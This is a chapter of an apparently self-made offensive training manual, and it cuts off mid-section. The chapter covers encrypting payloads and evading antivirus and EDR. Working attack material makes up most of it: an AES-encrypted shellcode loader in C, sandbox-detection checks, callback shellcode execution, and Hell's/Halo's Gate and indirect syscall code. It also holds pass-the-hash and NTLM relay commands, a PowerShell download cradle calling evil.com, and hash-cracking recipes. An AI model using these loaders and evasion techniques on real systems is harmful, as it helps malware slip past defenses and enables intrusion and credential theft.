# Chapter 18 — Cryptography & Evasion: The Art of Hiding

**VADER-RCE Field Manual**
**Prerequisite**: Chapter 17 (Network Warfare), GaySun XOR payload experience
**Drill**: DRILLS/18_crypto_evasion/

---

## Why You Need This

You've built payloads. You've corrupted memory. You've pivoted through
networks. None of that matters if Defender catches you at the door.

Modern AV/EDR is a layered defense: static signature matching, behavioral
heuristics, memory scanning, API hook monitoring, cloud-based ML
classification. Each layer is a filter. Your payload has to pass through
ALL of them to execute.

Cryptography is your primary tool for evading static analysis. If
Defender can't read your payload, it can't match a signature against
it. But encryption alone isn't enough — you also need to evade behavioral
detection (what your code DOES), heuristic detection (what your code
LOOKS LIKE it might do), and memory scanning (what's in memory after
decryption).

This chapter covers both sides: the crypto fundamentals you need to
understand encryption/decryption in offensive operations, and the
evasion techniques that use those fundamentals to get past modern
defenses. You already used XOR in GaySun. Now you learn WHY it worked,
when it won't work, and what to use instead.

---

## Crypto Fundamentals — What You Actually Need

Skip the academic theory. You don't need to prove RSA's correctness
or implement AES from scratch. You need to know what each primitive
does, when to use it, and how defenders break it.

### Symmetric Encryption — One Key, Two Directions

Same key encrypts and decrypts. Fast. Used for bulk data.

**XOR — The Simplest Cipher**

You already know this from GaySun. XOR is reversible:

```
plaintext  XOR key = ciphertext
ciphertext XOR key = plaintext
```

```python
# XOR encryption/decryption — identical operation
def xor_crypt(data: bytes, key: bytes) -> bytes:
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

shellcode = b"\xfc\x48\x83\xe4\xf0..."
key = b"\xde\xad\xbe\xef"

encrypted = xor_crypt(shellcode, key)    # encrypt
decrypted = xor_crypt(encrypted, key)    # decrypt — same function
assert decrypted == shellcode
```

**XOR's weakness**: With a short repeating key, XOR is trivially
broken by frequency analysis. Defender KNOWS this. Modern AV engines
XOR-decode suspicious blobs with common key lengths (1-16 bytes) and
check the result against signature databases. A 4-byte XOR key buys
you nothing against a competent scanner.

**When XOR still works**: Single-byte XOR against a unique key that
changes per build. Not for the crypto — for the obfuscation. It forces
the scanner to brute-force 256 possible decodings. Combined with other
techniques, it adds friction.

**AES — The Standard**

AES-128, AES-192, AES-256. Block cipher operating on 16-byte blocks.
This is what you use when you actually need encryption that holds up.

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import os

def aes_encrypt(plaintext: bytes, key: bytes) -> tuple:
    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
    return iv, ciphertext

def aes_decrypt(iv: bytes, ciphertext: bytes, key: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ciphertext), AES.block_size)

# Generate a random 256-bit key
key = get_random_bytes(32)

# Encrypt shellcode
shellcode = b"\xfc\x48\x83\xe4\xf0..."
iv, encrypted = aes_encrypt(shellcode, key)

# Decrypt at runtime
decrypted = aes_decrypt(iv, encrypted, key)
```

**CBC mode**: Each block is XOR'd with the previous ciphertext block
before encryption. The first block uses the Initialization Vector (IV).
This means identical plaintext blocks produce different ciphertext
blocks — no patterns leak through.

**Why AES defeats static analysis**: Without the key, the ciphertext
is indistinguishable from random data. Defender can't brute-force a
256-bit key. It can't apply signature matching to random bytes. The
payload is invisible until runtime decryption.

**RC4 — Stream Cipher, Simple Implementation**

RC4 is broken for TLS but perfectly fine for payload encryption. It's
a stream cipher — generates a keystream from the key and XORs it with
the plaintext. Simpler to implement than AES, smaller code footprint.

```python
# RC4 implementation — small enough to embed in a loader
def rc4(key: bytes, data: bytes) -> bytes:
    S = list(range(256))
    j = 0
    # Key-scheduling algorithm (KSA)
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    # Pseudo-random generation algorithm (PRGA)
    i = j = 0
    result = bytearray()
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        result.append(byte ^ S[(S[i] + S[j]) % 256])
    return bytes(result)

encrypted = rc4(b"my_secret_key", shellcode)
decrypted = rc4(b"my_secret_key", encrypted)  # same function, same key
```

**RC4 in the wild**: Cobalt Strike uses RC4 for stager communication.
Metasploit's `shikata_ga_nai` encoder uses a polymorphic XOR scheme
that's conceptually similar. Many real-world implants use RC4 because
it's fast, simple, and good enough for obfuscation.

### Asymmetric Encryption — Two Keys

Public key encrypts. Private key decrypts. Or: private key signs,
public key verifies. The math is hard to reverse (factoring large
primes for RSA, discrete logarithms for ECC).

**Where you'll encounter this in offensive ops**:
- **TLS/SSL**: Every HTTPS connection uses asymmetric crypto for key
  exchange, then symmetric crypto for the actual data. Your C2 traffic
  over HTTPS is protected by this.
- **SSH**: Key-based authentication uses RSA/Ed25519 keypairs.
- **Code signing**: Legitimate software is signed with a private key.
  Defenders check signatures. If you can sign your payload with a
  stolen code-signing certificate, it bypasses signature-based trust.
- **Key exchange**: Your implant and C2 server need a shared secret
  for symmetric encryption. Diffie-Hellman or RSA key exchange
  establishes this without ever transmitting the key in the clear.

```python
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

# Generate RSA keypair (done once, offline)
key = RSA.generate(2048)
private_key = key.export_key()
public_key = key.publickey().export_key()

# Encrypt with public key (anyone can do this)
recipient_key = RSA.import_key(public_key)
cipher = PKCS1_OAEP.new(recipient_key)
encrypted = cipher.encrypt(b"secret_session_key_here")

# Decrypt with private key (only key holder)
private = RSA.import_key(private_key)
decipher = PKCS1_OAEP.new(private)
decrypted = decipher.decrypt(encrypted)
```

### Hashing — One-Way Functions

Hashing takes arbitrary-length input and produces a fixed-length digest.
It's one-way — you can't reverse a hash to get the original input. You
can only compare: does this input produce the same hash?

**Hash algorithms you'll encounter**:

| Algorithm | Output | Status | Where you'll see it |
|-----------|--------|--------|-------------------|
| MD5 | 128-bit | BROKEN (collisions) | Legacy file checksums, some password stores |
| SHA-1 | 160-bit | BROKEN (collisions) | Legacy certificate signing, git commits |
| SHA-256 | 256-bit | Current standard | File integrity, modern password hashing |
| SHA-512 | 512-bit | Strong | Linux /etc/shadow (sha512crypt) |
| NTLM | 128-bit | WEAK (unsalted MD4) | Windows password hashes. Your bread and butter. |
| NTLMv2 | Variable | Better (challenge-response) | Windows network authentication |
| Net-NTLMv2 | Variable | Challenge-response | What Responder captures |

**Why NTLM hashes are as good as passwords**:

NTLM is just `MD4(UTF-16LE(password))`. No salt. No iterations. Two
users with the same password have the same NTLM hash. And here's the
critical part for offensive ops: **Windows accepts NTLM hashes directly
for authentication.** You don't need to crack the hash to use it.

```bash
# Pass-the-Hash — authenticate with the hash, no password needed
# Using evil-winrm:
evil-winrm -i <target> -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Using impacket's psexec:
python psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@<target>

# Using crackmapexec:
crackmapexec smb <target> -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
```

This is why NTLM hash extraction (from SAM, LSASS, DCSync) is such a
high-value post-exploitation step. The hash IS the credential.

---

## Encryption In Offensive Operations

### Encrypting Payloads

The goal: your payload binary/shellcode should look like random noise
to any static analysis tool until the moment it executes.

**The pattern**:
1. Generate shellcode (msfvenom, custom, whatever)
2. Encrypt it with a strong algorithm and unique key
3. Build a loader that contains: encrypted blob + decryption routine + key
4. At runtime: decrypt → allocate executable memory → copy → execute

```c
// C loader structure — the pattern every AV-evading loader follows
#include <windows.h>
#include <stdio.h>

// AES-encrypted shellcode blob (generated by your encryptor script)
unsigned char encrypted_shellcode[] = { 0x8a, 0x3f, 0x7c, ... };
unsigned char aes_key[] = { 0x01, 0x02, 0x03, ... };  // 32 bytes
unsigned char aes_iv[]  = { 0xa1, 0xb2, 0xc3, ... };  // 16 bytes

// AES-CBC decryption using Windows CNG (no external dependencies)
BOOL decrypt_payload(unsigned char* ciphertext, DWORD ct_len,
                     unsigned char* key, unsigned char* iv,
                     unsigned char** plaintext, DWORD* pt_len) {
    BCRYPT_ALG_HANDLE hAlg;
    BCRYPT_KEY_HANDLE hKey;

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                      sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key, 32, 0);

    // Get output size
    BCryptDecrypt(hKey, ciphertext, ct_len, NULL, iv, 16, NULL, 0, pt_len, BCRYPT_BLOCK_PADDING);

    *plaintext = (unsigned char*)malloc(*pt_len);
    BCryptDecrypt(hKey, ciphertext, ct_len, NULL, iv, 16, *plaintext, *pt_len, pt_len, BCRYPT_BLOCK_PADDING);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return TRUE;
}

int main() {
    unsigned char* shellcode;
    DWORD shellcode_len;

    // Decrypt at runtime
    decrypt_payload(encrypted_shellcode, sizeof(encrypted_shellcode),
                    aes_key, aes_iv, &shellcode, &shellcode_len);

    // Allocate executable memory
    void* exec = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE,
                              PAGE_READWRITE);
    memcpy(exec, shellcode, shellcode_len);

    // Change permissions to executable
    DWORD old;
    VirtualProtect(exec, shellcode_len, PAGE_EXECUTE_READ, &old);

    // Execute
    ((void(*)())exec)();

    return 0;
}
```

**Key management for payloads**: The key has to be in the binary
somewhere (or derived at runtime). Options:
- **Hardcoded key**: Simplest. Key is in the binary. Defender could
  extract it and decrypt — but it has to KNOW it's a key first. Combined
  with string obfuscation, this works.
- **Environmental keying**: Derive the key from the target environment
  (hostname, domain name, username, MAC address). The payload only
  decrypts on the intended target. Sandbox analysis fails because the
  sandbox has different environment values.
- **Remote key fetch**: Payload calls home to get the key. If the C2
  server is down, the payload never decrypts. Clean forensics.
- **Staged delivery**: First stage is tiny and innocuous — it downloads
  and decrypts the second stage. The encrypted payload never touches
  disk as a file.

### Encrypting C2 Traffic

Your implant needs to talk to your server. That traffic needs to be
encrypted and look legitimate.

**TLS (HTTPS C2)**: The easiest option. Your C2 traffic looks like
normal HTTPS browsing. Use legitimate certificates (Let's Encrypt),
domain fronting (if still available), or CDN redirectors.

**Custom crypto channel**: For situations where you need more control:

```python
# Simple encrypted C2 communication pattern
import socket
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import struct

SHARED_KEY = b'\x00' * 32  # In reality, derived via key exchange

def encrypt_msg(plaintext: bytes) -> bytes:
    iv = get_random_bytes(16)
    cipher = AES.new(SHARED_KEY, AES.MODE_CBC, iv)
    ct = cipher.encrypt(pad(plaintext, AES.block_size))
    # Prepend IV and length
    return struct.pack('>I', len(ct)) + iv + ct

def decrypt_msg(data: bytes) -> bytes:
    length = struct.unpack('>I', data[:4])[0]
    iv = data[4:20]
    ct = data[20:20+length]
    cipher = AES.new(SHARED_KEY, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), AES.block_size)

# Implant sends encrypted tasking result
def send_result(sock, result: bytes):
    encrypted = encrypt_msg(result)
    sock.send(encrypted)

# C2 server receives and decrypts
def recv_task(sock) -> bytes:
    data = sock.recv(4096)
    return decrypt_msg(data)
```

**Malleable C2 profiles** (Cobalt Strike concept): Shape your C2 traffic
to mimic legitimate application traffic — match HTTP headers, URI
patterns, user-agent strings, and timing of a real application. The
encrypted payload rides inside what looks like normal API calls.

---

## Encoding vs Encryption vs Obfuscation

These are NOT interchangeable. Confusing them is how payloads get caught.

### Encoding — Reversible Without a Key

Encoding transforms data into a different representation. No key needed
to reverse it. Base64, URL encoding, hex encoding — these are FORMAT
CONVERSIONS, not security measures.

```bash
# Base64 encoding a PowerShell command
echo -n 'IEX(New-Object Net.WebClient).DownloadString("http://evil.com/shell.ps1")' | base64

# Defender's response to base64:
# "Oh look, a base64 string being passed to PowerShell. Let me decode it.
#  Yep, that's malicious. Blocked."

# AMSI literally decodes base64 before scanning
# Base64 is NOT evasion. It's a FORMAT.
```

**When encoding IS useful**: Not for hiding content, but for transport.
Base64 a binary payload to embed it in a text-based protocol (HTTP,
DNS TXT records). The encoding solves a transport problem, not a
detection problem.

### Encryption — Requires a Key to Reverse

Encryption transforms data using a key. Without the key, the data is
unrecoverable. This IS a security measure.

**The spectrum of strength against AV**:
- **Single-byte XOR**: Defender brute-forces all 256 keys. Trivially
  broken. Maybe buys you 10 seconds of analysis time.
- **Multi-byte XOR (short key)**: Defender tries common key lengths
  (2-32 bytes). Crackable via frequency analysis. Slightly better.
- **XOR with key = length of payload**: One-time pad. Theoretically
  unbreakable. But storing a key the same size as the payload is
  impractical and the key itself looks suspicious.
- **AES-CBC with random key**: Defender cannot break this with static
  analysis. The ciphertext is indistinguishable from random data.
  The key must be somewhere in the binary or derived at runtime —
  that's the weak point, but it's a much harder problem for automated
  scanners.

### Obfuscation — Making Code Hard to Read

Obfuscation doesn't hide data — it makes the CODE harder to analyze.
Variable renaming, control flow flattening, dead code insertion, string
splitting.

```python
# Before obfuscation:
import subprocess
subprocess.Popen(["powershell", "-ep", "bypass", "-c", "IEX(...)"])

# After basic obfuscation:
import subprocess as _0x1f
_0x2a = chr(112)+chr(111)+chr(119)+chr(101)+chr(114)+chr(115)+chr(104)+chr(101)+chr(108)+chr(108)
_0x3b = [_0x2a, "-ep", "bypass", "-c", "IEX(...)"]
getattr(_0x1f, chr(80)+chr(111)+chr(112)+chr(101)+chr(110))(_0x3b)

# After GOOD obfuscation:
# Control flow is flattened, strings are encrypted, API calls are resolved
# dynamically, dead code paths are inserted, variable names are randomized.
# A human reverser needs hours. Automated analysis needs specific deobfuscation.
```

**The hierarchy**: Encoding < Obfuscation < Encryption. Use encryption
for the payload, obfuscation for the loader code, and encoding only
for transport.

---

## AV/EDR Evasion Taxonomy

Modern endpoint security operates in multiple layers. Understanding
each layer tells you what technique evades which detection mechanism.

### Signature Evasion — Change What You Look Like

Signature-based detection matches known byte patterns. Change the
bytes and the signature doesn't match.

**String mutation**: AV signatures often match on specific strings in
the binary — function names, hardcoded URLs, known shellcode patterns.

```c
// Before: Defender signatures match "VirtualAlloc" string import
void* exec = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

// After: Dynamic API resolution — no "VirtualAlloc" string in binary
typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);

// XOR-encrypted function name
unsigned char enc_name[] = { 0x36, 0x49, 0x52, 0x54, 0x55, 0x41, 0x4c, ... };
char func_name[32];
xor_decrypt(enc_name, sizeof(enc_name), func_name, xor_key);  // → "VirtualAlloc"

pVirtualAlloc myAlloc = (pVirtualAlloc)GetProcAddress(
    GetModuleHandleA("kernel32.dll"), func_name);
void* exec = myAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
```

**Packing/Compression**: Pack the entire binary with UPX or a custom
packer. The unpacking stub is small and benign-looking. The actual
payload is compressed/encrypted in the packed section.

```bash
# UPX packing — basic, but most AV now unpacks UPX automatically
upx --best payload.exe -o packed.exe

# Custom packers are more effective because AV doesn't have a generic
# unpacker for them. Writing a custom packer is a solid exercise.
```

**Metamorphism**: Generate functionally identical code with different
byte sequences each time. Same behavior, different signature. This is
what advanced malware frameworks do — every build produces a unique binary.

### Behavioral Evasion — Change What You Do (Or When)

Behavioral detection watches what your code DOES at runtime. Allocating
RWX memory, writing shellcode to it, creating remote threads — these
are behavioral indicators.

**Hardware Breakpoints (HWBP)**: You already did this. Setting hardware
breakpoints on ntdll functions to intercept and modify behavior before
EDR hooks see it.

**Sleep timers and delayed execution**: Sandboxes have time limits. If
your payload sleeps for 5 minutes before doing anything malicious, the
sandbox times out and reports "benign." But modern sandboxes fast-forward
sleep calls — so you need smarter delays:

```c
// Naive sleep — sandbox detects and fast-forwards
Sleep(300000);  // 5 minutes — sandbox patches this to return immediately

// Better: time-based check
DWORD start = GetTickCount();
// Do some busy work (calculate primes, allocate/free memory, etc.)
volatile int x = 0;
for (int i = 0; i < 100000000; i++) x += i;
DWORD elapsed = GetTickCount() - start;

// If elapsed < 1000ms, we're in a sandbox that fast-forwarded our busy loop
if (elapsed < 1000) ExitProcess(0);

// Even better: use NtDelayExecution and check with QueryPerformanceCounter
// Sandboxes that hook Sleep might not hook the NT-level equivalent
```

**Environment checks**: Detect sandboxes before executing the payload:

```c
// Check for common sandbox indicators
BOOL is_sandbox() {
    // Check RAM (sandboxes often have <4GB)
    MEMORYSTATUSEX mem;
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < 4LL * 1024 * 1024 * 1024) return TRUE;

    // Check CPU cores (sandboxes often have 1-2 cores)
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return TRUE;

    // Check for recent user interaction (sandbox = no mouse movement)
    LASTINPUTINFO lii;
    lii.cbSize = sizeof(lii);
    GetLastInputInfo(&lii);
    if ((GetTickCount() - lii.dwTime) > 600000) return TRUE;  // 10min idle

    // Check disk size (sandbox disks are often <60GB)
    ULARGE_INTEGER disk;
    GetDiskFreeSpaceExA("C:\\", NULL, &disk, NULL);
    if (disk.QuadPart < 60LL * 1024 * 1024 * 1024) return TRUE;

    // Check for VM artifacts
    // Registry: HKLM\SOFTWARE\VMware, Inc.
    // Files: C:\windows\system32\drivers\vmhgfs.sys
    // Processes: vmtoolsd.exe, vmwaretray.exe
    // MAC address prefixes: 00:0C:29, 00:50:56 (VMware)

    return FALSE;
}
```

### Heuristic Evasion — Don't Look Suspicious

Heuristic engines analyze code patterns without specific signatures.
"This binary allocates RWX memory, writes to it, then calls it as a
function — that's suspicious regardless of what it writes."

**API call patterns**: Instead of the classic
`VirtualAlloc→memcpy→VirtualProtect→CreateThread` chain that every
shellcode loader uses, break the pattern:

```c
// Classic pattern — every EDR flags this
void* mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
memcpy(mem, shellcode, size);
DWORD old;
VirtualProtect(mem, size, PAGE_EXECUTE_READ, &old);
CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);

// Pattern-broken version:
// 1. Use different allocation API
void* mem = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size + 0x1000);
// 2. Copy in chunks with delays between
for (int i = 0; i < size; i += 64) {
    memcpy((char*)mem + i, shellcode + i, min(64, size - i));
    SleepEx(1, FALSE);  // tiny delay between copies
}
// 3. Use NtProtectVirtualMemory instead of VirtualProtect
// 4. Execute via callback, not CreateThread
EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, 0);
// Windows calls YOUR code as a callback. No CreateThread needed.
```

**Callback execution techniques** — ways to execute shellcode without
calling `CreateThread` or `CreateRemoteThread`:

```c
// These all execute a function pointer through legitimate Windows callbacks:
EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)shellcode_addr, 0);
EnumChildWindows(NULL, (WNDENUMPROC)shellcode_addr, 0);
EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)shellcode_addr, 0);
CreateTimerQueueTimer(&timer, NULL, (WAITORTIMERCALLBACK)shellcode_addr, NULL, 0, 0, 0);
```

### Memory Evasion — Hide What's In RAM

EDR scans process memory looking for known shellcode patterns. Even
after your encrypted payload decrypts and executes, the decrypted
shellcode is in memory and scannable.

**Encrypted sleep**: After the payload executes each task, re-encrypt
itself in memory before sleeping. Decrypt again when the next task
arrives. Reduces the window where scannable shellcode exists in memory.

**Module stomping**: Load a legitimate DLL, then overwrite its `.text`
section with your shellcode. Memory scanners see a loaded DLL at that
address — it looks normal. The content is your code.

**Manual DLL mapping**: Map a DLL into memory manually without using
`LoadLibrary`. This avoids the DLL appearing in the PEB's loaded
module list. EDR tools that enumerate loaded modules won't see it.

---

## Modern Evasion Techniques

### Direct Syscalls — Bypass ntdll.dll Hooks

When your code calls `VirtualAlloc`, the call chain is:
```
Your code → kernel32.dll!VirtualAlloc → ntdll.dll!NtAllocateVirtualMemory → syscall → kernel
```

EDR products hook ntdll.dll functions — they replace the first
instructions with a `JMP` to their monitoring code. Every call through
ntdll passes through the EDR's hooks first.

**Direct syscalls skip ntdll entirely**:
```
Your code → syscall instruction (inline assembly) → kernel
```

No ntdll, no hooks, no EDR visibility.

```nasm
; Direct syscall for NtAllocateVirtualMemory (Windows 10 21H2)
; Syscall number (SSN) = 0x18
mov r10, rcx
mov eax, 0x18          ; syscall number for NtAllocateVirtualMemory
syscall
ret
```

**The problem**: Syscall numbers change between Windows versions. The
SSN for `NtAllocateVirtualMemory` might be 0x18 on one build and 0x1A
on another. You need to resolve the correct SSN at runtime.

### Hell's Gate — Dynamic SSN Resolution

Hell's Gate reads the SSN directly from the ntdll.dll image in memory:

```c
// Simplified Hell's Gate concept
// NtAllocateVirtualMemory in ntdll starts with:
//   4c 8b d1     mov r10, rcx
//   b8 XX 00 00 00  mov eax, <SSN>
//   ...
//   0f 05        syscall
//   c3           ret

// If it starts with 4c 8b d1 b8, the SSN is the byte after b8
// If it starts with e9 (JMP) — the function is HOOKED

DWORD get_ssn(FARPROC func_addr) {
    BYTE* bytes = (BYTE*)func_addr;
    // Check if function is hooked (starts with JMP)
    if (bytes[0] == 0xe9) {
        // Function is hooked — Hell's Gate fails here
        // Need Halo's Gate or another technique
        return 0;
    }
    // Unhooked: extract SSN from mov eax, <SSN>
    if (bytes[0] == 0x4c && bytes[1] == 0x8b && bytes[2] == 0xd1 &&
        bytes[3] == 0xb8) {
        return *(DWORD*)(bytes + 4);
    }
    return 0;
}
```

### Halo's Gate — When Hell's Gate Fails

If the target function IS hooked (starts with JMP instead of the
expected prologue), Halo's Gate looks at NEIGHBORING functions. SSNs
are sequential — if `NtAllocateVirtualMemory` has SSN 0x18, the
function above it in ntdll's export table has SSN 0x17 and the one
below has SSN 0x19.

```c
// Halo's Gate: if target function is hooked, check neighbors
DWORD halos_gate(FARPROC func_addr, DWORD func_index_in_table) {
    BYTE* bytes = (BYTE*)func_addr;

    // If not hooked, use Hell's Gate directly
    if (bytes[0] == 0x4c && bytes[3] == 0xb8)
        return *(DWORD*)(bytes + 4);

    // Check function ABOVE (subtract one syscall stub size, typically 32 bytes)
    // SSN of neighbor - offset = our SSN
    for (int offset = 1; offset < 500; offset++) {
        BYTE* neighbor_up = bytes - (offset * 32);  // stub size varies
        if (neighbor_up[0] == 0x4c && neighbor_up[3] == 0xb8) {
            return *(DWORD*)(neighbor_up + 4) + offset;
        }
        BYTE* neighbor_down = bytes + (offset * 32);
        if (neighbor_down[0] == 0x4c && neighbor_down[3] == 0xb8) {
            return *(DWORD*)(neighbor_down + 4) - offset;
        }
    }
    return 0;
}
```

### Indirect Syscalls

Direct syscalls have a telltale sign: the `syscall` instruction
executes from your module's memory range, not from ntdll.dll. EDR can
detect this by checking the return address on the stack.

**Indirect syscalls**: Instead of executing `syscall` in your own code,
find the `syscall; ret` gadget inside ntdll.dll and JMP to it. The
`syscall` instruction executes from ntdll's address range — exactly
where it's expected to be. But you set up the registers yourself,
skipping the hooked prologue.

```nasm
; Indirect syscall pattern:
; 1. Resolve SSN (Hell's Gate / Halo's Gate)
; 2. Find 'syscall; ret' gadget in ntdll
; 3. Set up registers as if ntdll did it
; 4. JMP to the gadget

mov r10, rcx
mov eax, 0x18                    ; SSN
jmp qword ptr [syscall_gadget]   ; JMP to ntdll's syscall;ret
; Return address on stack points to ntdll — EDR sees nothing unusual
```

### Module Stomping

Instead of allocating new memory (which EDR monitors), overwrite an
existing legitimate DLL's code section:

1. Load a benign DLL with `LoadLibrary` (e.g., `amsi.dll`, `xpsprint.dll`)
2. Find its `.text` section
3. Change permissions to RW
4. Overwrite with your shellcode
5. Change permissions back to RX
6. Execute

Memory scanners see a legitimate module loaded at that address. The
module's file on disk matches the PE headers. The `.text` content
doesn't match — but not every scanner checks this, and the ones that
do need to read from disk and compare byte-by-byte.

### Process Hollowing

Create a suspended legitimate process, hollow out its memory, replace
it with your payload, resume execution. The process looks legitimate
in Task Manager, running from a trusted path.

```
1. CreateProcess("svchost.exe", ..., CREATE_SUSPENDED)
2. NtUnmapViewOfSection(process, base_address)      // hollow it out
3. VirtualAllocEx(process, base_address, ...)        // allocate new space
4. WriteProcessMemory(process, base_address, payload, ...)  // write your PE
5. SetThreadContext(thread, ...)                      // fix entry point
6. ResumeThread(thread)                              // execute
```

From the outside: `svchost.exe` running from `C:\Windows\System32\`.
Inside: your payload. EDR detects this by checking if the in-memory
image matches the on-disk file — but the detection isn't perfect,
especially with variations (process doppelganging, process herpaderping,
transacted hollowing).

### Early Bird Injection

A variant of APC injection that fires before EDR's userland hooks are
initialized:

1. Create a suspended process
2. Allocate and write shellcode into its memory
3. Queue an APC (Asynchronous Procedure Call) to the main thread
4. Resume the thread

The APC fires when the thread enters an alertable wait state — which
happens during process initialization, BEFORE the EDR's DLL gets
loaded and hooks are placed. Your code runs in a window where no hooks
exist yet.

### Thread Execution Hijack

Instead of creating a new thread (which EDR monitors), hijack an
existing one:

1. Find a running thread in the target process
2. `SuspendThread(thread)`
3. `GetThreadContext(thread, &ctx)` — save current state
4. `ctx.Rip = shellcode_address` — point instruction pointer to shellcode
5. `SetThreadContext(thread, &ctx)` — apply modified context
6. `ResumeThread(thread)` — thread now executes your shellcode

No new thread created. No `CreateRemoteThread` call. The existing
thread just "happens" to execute different code after being briefly
suspended.

---

## Hash Cracking

Post-exploitation credential access. You've dumped hashes from LSASS,
SAM, NTDS.dit, or captured them with Responder. Now you need plaintext
passwords (or sometimes just the hashes themselves — pass-the-hash).

### Hash Types You'll Encounter

```
# NTLM (from SAM or LSASS dump)
# Format: username:RID:LM_hash:NT_hash:::
Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# Hashcat mode: -m 1000

# Net-NTLMv2 (from Responder capture)
# Format: user::domain:challenge:response:blob
admin::CORP:1122334455667788:A1B2C3...:0101000000000000...
# Hashcat mode: -m 5600

# Kerberoast (TGS-REP encrypted with service account password)
# Format: $krb5tgs$23$*user$realm$service...*$hash
$krb5tgs$23$*svc_sql$CORP.LOCAL$...*$a1b2c3...
# Hashcat mode: -m 13100

# AS-REP Roast (for accounts with "Do not require Kerberos pre-auth")
# Format: $krb5asrep$23$user@realm:hash
$krb5asrep$23$jsmith@CORP.LOCAL:a1b2c3...
# Hashcat mode: -m 18200

# Linux shadow (SHA-512)
# Format: $6$salt$hash
$6$rounds=5000$saltsalt$hash...
# Hashcat mode: -m 1800
```

### Hashcat — GPU-Accelerated Cracking

```bash
# Basic dictionary attack
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt

# Dictionary + rules (applies transformations to each word)
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Common rule files:
#   best64.rule     — 64 most effective rules, fast
#   rockyou-30000.rule — aggressive, 30000 transformations per word
#   d3ad0ne.rule    — large ruleset
#   OneRuleToRuleThemAll.rule — community favorite
#   dive.rule       — comprehensive

# Mask attack (brute force with pattern)
# ?l = lowercase, ?u = uppercase, ?d = digit, ?s = special
hashcat -m 1000 hash.txt -a 3 ?u?l?l?l?l?l?d?d   # Password12 pattern
hashcat -m 1000 hash.txt -a 3 ?d?d?d?d?d?d?d?d    # 8-digit PIN

# Hybrid: dictionary + mask
hashcat -m 1000 hash.txt -a 6 rockyou.txt ?d?d?d?d  # word + 4 digits
hashcat -m 1000 hash.txt -a 7 ?d?d?d?d rockyou.txt  # 4 digits + word

# Kerberoast cracking
hashcat -m 13100 tgs_hashes.txt rockyou.txt -r best64.rule

# Show cracked passwords
hashcat -m 1000 hash.txt --show

# Performance stats
hashcat -b   # benchmark all modes
```

### John the Ripper

```bash
# Basic attack
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# With rules (John has its own rule syntax)
john --wordlist=rockyou.txt --rules=jumbo hashes.txt

# Specify hash format
john --format=nt hashes.txt              # NTLM
john --format=netntlmv2 hashes.txt      # Net-NTLMv2
john --format=krb5tgs hashes.txt        # Kerberoast

# Show cracked
john --show hashes.txt

# Create custom rules in john.conf:
# [List.Rules:custom]
# Az"[0-9][0-9][0-9]"    # append 3 digits
# c                        # capitalize first letter
# $[!@#$%]                # append special char
```

### When To Crack vs When To Relay

**Crack** when you need the plaintext (for password reuse across systems,
for services that require plaintext, for offline access).

**Relay** when time matters. NTLM relay (with ntlmrelayx) forwards the
authentication attempt to another server in real-time. No cracking
needed. The victim authenticates to you, you forward that authentication
to the target. If the victim has admin rights on the target — you win.

```bash
# NTLM relay with impacket
ntlmrelayx.py -t <target_ip> -smb2support

# Relay to multiple targets from a list
ntlmrelayx.py -tf targets.txt -smb2support

# Relay and execute a command
ntlmrelayx.py -t <target> -smb2support -c "whoami"

# Relay to LDAP (for adding a machine account, modifying ACLs)
ntlmrelayx.py -t ldaps://<dc_ip> --add-computer
```

---

## Crypto Attacks — Know They Exist

You're not going to implement these from scratch (probably). But you
need to recognize when they apply and know how to use the tools.

### Padding Oracle Attack (CBC Mode)

CBC decryption XORs each decrypted block with the previous ciphertext
block. If the server tells you whether the PADDING is valid (even
indirectly — different error codes, different response times), you can
decrypt the entire ciphertext one byte at a time without knowing the key.

```
How it works (simplified):
1. Modify the last byte of the second-to-last ciphertext block
2. Send to server
3. Server decrypts → checks padding → reports valid or invalid
